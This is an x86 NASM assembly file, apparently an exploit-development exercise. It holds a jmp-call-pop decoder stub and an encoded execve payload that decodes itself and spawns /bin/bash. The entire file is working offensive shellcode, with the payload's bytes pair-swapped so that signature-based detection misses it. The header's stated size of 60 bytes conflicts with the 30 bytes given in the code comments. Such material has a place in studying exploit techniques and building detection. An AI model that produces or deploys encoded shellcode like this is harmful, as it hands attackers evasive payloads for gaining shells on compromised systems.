; Filename: enocder.nasm
; Author: h3ll0clar1c3
; Purpose: Decode the encoded shellcode and spawn a shell on the local host   
; Compilation: ./compile.sh encoder
; Usage: ./encoder
; Shellcode size: 60 bytes
; Architecture: x86

global   _start

section .text
        _start:

	; jump to encoded shellcode
	jmp short call_shellcode
	
	decoder:
	pop esi                         ; put address to EncodedShellcode into ESI (jmp-call-pop)
        xor eax, eax                    ; clear eax register (data)
        xor ecx, ecx                    ; clear ecx register (loop counter)
        mov cl, 15                      ; loop 15 times (shellcode is 30 bytes in length)
	
	decode:
        ; switch data between esi and esi+1
        mov  al, byte [esi]
        xchg byte [esi+1], al
        mov [esi], al

        ; loop through each of the 2 bytes within the 4 byte segment and decode
        add esi, 2
        loop decode

        ; jump to decoded shellcode
        jmp short EncodedShellcode

	call_shellcode:
        call decoder
	EncodedShellcode: db 0xc0,0x31,0x68,0x50,0x61,0x62,0x68,0x73,0x62,0x68,0x6e,0x69,0x68,0x2f,0x2f,0x2f,0x2f	 ,0x2f,0xe3,0x89,0x89,0x50,0x53,0xe2,0xe1,0x89,0x0b,0xb0,0x80,0xcd

